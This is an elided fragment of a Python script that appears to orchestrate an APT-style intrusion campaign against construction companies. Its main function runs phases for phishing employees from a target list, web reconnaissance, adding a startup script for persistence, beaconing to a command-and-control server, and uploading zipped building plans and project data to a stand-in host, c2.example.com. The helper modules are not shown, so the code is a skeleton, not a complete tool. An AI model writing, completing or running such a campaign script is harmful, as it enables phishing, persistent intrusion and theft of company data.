...
def main():
    """
    Main function to run the construction_company_campaign campaign.
    """
    print(f"[*] Starting construction_company_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    initial_access.phishing_attack("construction_companies_employees.txt")
    run_tool("apt_web_recon.js", "--target construction_companies.com")


    # 2. Persistence
    print("\n[*] Phase 2: Persistence")
    persistence.add_startup_script("payloads/building_plans_and_project_data_exfiltrator.py")
    ...
    command_control.send_beacon(c2_server, "VICTIM-CONSTRUCTION_COMPANIES-01")
    ...
    exfiltration.exfiltrate_data("building_plans_and_project_data/building_plans_and_project_data.zip", "https://c2.example.com/upload")
    run_tool("payloads/building_plans_and_project_data_exfiltrator.py")
